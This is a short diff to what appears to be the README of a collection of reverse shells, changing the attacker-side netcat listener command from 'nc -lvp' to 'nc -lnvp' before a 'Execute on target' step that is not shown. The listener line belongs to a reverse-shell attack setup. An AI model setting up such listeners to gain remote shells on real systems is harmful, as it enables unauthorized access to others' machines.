@@ -6,7 +6,7 @@ A collection of reverse shells written in various languages
 
 Listen on attacker machine:
 ```
-nc -lvp <LISTENING PORT>
+nc -lnvp <LISTENING PORT>
 ```
 
 ### 2. Execute on target:
